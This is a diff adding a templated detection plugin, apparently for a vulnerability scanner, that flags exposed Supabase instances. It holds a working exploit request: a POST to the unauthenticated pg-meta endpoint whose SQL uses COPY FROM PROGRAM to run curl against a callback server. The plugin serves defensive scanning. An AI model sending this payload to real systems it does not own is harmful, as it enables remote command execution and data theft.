@@ -1,0 +1,114 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Supabase_ExposedUI"
+  author: "secureness"
+  version: "0.2"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "Supabase_ExposedUI"
+  }
+  title: "Exposed Supabase instance"
+  description: "Supabase instance appears publicly reachable without proper authentication. unauthenticated access to pg-meta endpoints can allow arbitrary SQL (e.g., using COPY FROM PROGRAM) leading to data exfiltration, schema tampering, and potential remote command execution."
+  recommendation:
+      " Restrict network exposure, enforce API key / auth, Configure authentication or ensure the Supabase instance is not exposed to the network. See "
+          "https://supabase.com/docs/guides/self-hosting/docker#managing-your-secrets for details."
+  severity: CRITICAL
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_supabase"
+  http_request: {
+    method: GET
+    uri: "/project/default"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: { } contains: '<title data-next-head="">Supabase</title>' }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "trigger_code_execution"
+  http_request: {
+    method: POST
+    uri: "/api/platform/pg-meta/default/query?key="
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: '{"query":"CREATE TABLE filelist (filename text);\\nCOPY filelist FROM PROGRAM \'curl {{ T_CBS_URI }} \';\\nSELECT * FROM filelist;","disable_statement_timeout":true}'
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: { } contains: '[{"filename":"' }
+        ]
+      }
+    }
+  }
+  cleanup_actions: "cleanup_trigger_code_execution"
+}
+
+actions: {
+  name: "cleanup_trigger_code_execution"
+  http_request: {
+    method: POST
+    uri: "/api/platform/pg-meta/default/query?key="
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: '{"query":"drop table filelist","disable_statement_timeout":true}'
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: { } contains: "[]" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 3000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "fingerprint_supabase",
+    "trigger_code_execution",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
